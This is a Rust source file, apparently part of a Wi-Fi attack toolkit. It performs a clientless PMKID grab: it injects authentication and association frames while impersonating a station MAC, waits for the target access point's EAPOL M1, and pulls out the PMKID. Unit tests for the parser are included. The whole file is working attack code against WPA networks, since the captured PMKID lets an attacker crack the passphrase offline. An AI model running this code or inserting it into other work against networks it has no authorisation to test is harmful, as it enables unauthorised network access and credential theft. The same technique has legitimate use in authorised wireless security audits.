//! Clientless PMKID grab: authenticate (open) + associate against `ap`
//! impersonating station MAC `sta`, then watch the wire for the AP's EAPOL
//! M1 carrying an RSN PMKID KDE (vendor 0xdd, OUI 00-0f-ac, subtype 4).

use std::time::{Duration, Instant};

use anyhow::{Context, Result};
use crossbeam_channel::Sender;

use crate::common::{Event, MacAddr, PmkidCapture};
use crate::dot11::{build_assoc_req, build_auth_open, parse_eapol, parse_eapol_key};
use crate::radiotap::{INJECT_HDR, strip};
use crate::rawsock::RawSocket;

/// How long to watch for the M1 after associating.
const GRAB_WINDOW: Duration = Duration::from_secs(3);
/// Poll cadence on the socket.
const POLL_MS: u32 = 100;

/// Extract the 16-byte PMKID from an EAPOL-Key `key_data` field by walking
/// its (vendor) IEs for KDE `dd 14 00 0f ac 04 <16 bytes>`.
pub(crate) fn extract_pmkid(key_data: &[u8]) -> Option<[u8; 16]> {
    let mut cur = 0usize;
    while let (Some(&id), Some(&len)) = (key_data.get(cur), key_data.get(cur + 1)) {
        let len = len as usize;
        let body = key_data.get(cur + 2..cur + 2 + len)?;
        if id == 0xdd
            && len >= 20
            && body[0..3] == [0x00, 0x0f, 0xac]
            && body[3] == 4
        {
            return body.get(4..20)?.try_into().ok();
        }
        cur += 2 + len;
    }
    None
}

fn send_frame(sock: &RawSocket, frame: &[u8]) -> Result<()> {
    let mut buf = Vec::with_capacity(INJECT_HDR.len() + frame.len());
    buf.extend_from_slice(&INJECT_HDR);
    buf.extend_from_slice(frame);
    sock.send(&buf).context("pmkid: injecting frame")?;
    Ok(())
}

/// Single PMKID grab attempt against `ap` as `sta`; `essid` fills the
/// capture (and the association-request SSID IE). Returns `Ok(None)` on
/// timeout — the AP simply didn't volunteer a PMKID.
pub fn grab(
    sock: &RawSocket,
    ap: &MacAddr,
    sta: &MacAddr,
    essid: &str,
    tx: &Sender<Event>,
) -> Result<Option<PmkidCapture>> {
    sock.set_timeout(POLL_MS).context("pmkid: set_timeout")?;

    send_frame(sock, &build_auth_open(ap, sta, 1))?;
    let _ = tx.send(Event::Log(format!("pmkid: open-auth sent to {ap}")));
    send_frame(sock, &build_assoc_req(ap, sta, essid.as_bytes()))?;
    let _ = tx.send(Event::Log(format!("pmkid: assoc-req sent to {ap}")));

    let deadline = Instant::now() + GRAB_WINDOW;
    let mut buf = vec![0u8; 4096];
    while Instant::now() < deadline {
        match sock.recv(&mut buf) {
            Ok(n) => {
                let Some((_meta, frame)) = strip(&buf[..n]) else {
                    continue;
                };
                // addr1 (receiver, at offset 4 of any 802.11 header) must
                // be us or broadcast; the bssid side must be the target AP.
                if frame.len() >= 10 {
                    let addr1 = MacAddr(frame[4..10].try_into().expect("6-byte slice"));
                    if addr1 != *sta && !addr1.is_broadcast() {
                        continue;
                    }
                }
                let Some((bssid, _ap_is_sender, eapol)) = parse_eapol(frame) else {
                    continue;
                };
                if bssid != *ap {
                    continue;
                }
                let Some(key) = parse_eapol_key(eapol) else {
                    continue;
                };
                // M1 shape: ACK set, MIC not yet set.
                if !(key.key_ack && !key.key_mic) {
                    continue;
                }
                if let Some(pmkid) = extract_pmkid(key.key_data) {
                    return Ok(Some(PmkidCapture {
                        ap: *ap,
                        client: *sta,
                        essid: essid.to_string(),
                        pmkid,
                    }));
                }
            }
            Err(e)
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut =>
            {
                continue; // poll again until the deadline
            }
            Err(e) if e.kind() == std::io::ErrorKind::Interrupted => continue,
            Err(e) => return Err(e).context("pmkid: recv failed"),
        }
    }
    Ok(None)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extract_pmkid_finds_rsn_kde() {
        // dd 14 00 0f ac 04 <16-byte pmkid>
        let mut kd = vec![0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04];
        let pmkid = [0xabu8; 16];
        kd.extend_from_slice(&pmkid);
        assert_eq!(extract_pmkid(&kd), Some(pmkid));
    }

    #[test]
    fn extract_pmkid_skips_other_ies_first() {
        // Prepend a different vendor IE and an SSID IE before the KDE.
        let mut kd = vec![
            0xdd, 0x07, 0x00, 0x50, 0xf2, 0x02, 0x00, 0x01, 0x00, // WMM-ish
            0x00, 0x03, b'f', b'o', b'o', // SSID
        ];
        let pmkid = [0x42u8; 16];
        kd.extend_from_slice(&[0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04]);
        kd.extend_from_slice(&pmkid);
        assert_eq!(extract_pmkid(&kd), Some(pmkid));
    }

    #[test]
    fn extract_pmkid_rejects_wrong_subtype_and_oui() {
        // subtype 6 (GTK KDE) must not match.
        let gtk = [0xdd, 0x14, 0x00, 0x0f, 0xac, 0x06];
        assert_eq!(extract_pmkid(&gtk), None);
        // different OUI (00 50 f2 = Microsoft) must not match.
        let msft = [0xdd, 0x14, 0x00, 0x50, 0xf2, 0x04];
        assert_eq!(extract_pmkid(&msft), None);
        // Truncated PMKID body (len < 20) → None.
        let short = [0xdd, 0x08, 0x00, 0x0f, 0xac, 0x04, 1, 2];
        assert_eq!(extract_pmkid(&short), None);
        // Empty input.
        assert_eq!(extract_pmkid(&[]), None);
        // Truncated trailing IE (len overruns buffer) → None.
        let overrun = [0xdd, 0x14, 0x00, 0x0f];
        assert_eq!(extract_pmkid(&overrun), None);
    }

    #[test]
    fn extract_pmkid_ignores_non_keydata_rsn_style() {
        // The RSN IE itself (id 48 = 0x30) contains a PMKID list at its tail,
        // but our caller passes key_data KDEs only; an id-0x30 IE must be
        // skipped, not misparsed.
        let mut kd = vec![0x30, 0x14];
        kd.extend_from_slice(&[0u8; 20]); // rsn body filler
        let pmkid = [0x11u8; 16];
        kd.extend_from_slice(&[0xdd, 0x14, 0x00, 0x0f, 0xac, 0x04]);
        kd.extend_from_slice(&pmkid);
        assert_eq!(extract_pmkid(&kd), Some(pmkid));
    }
}
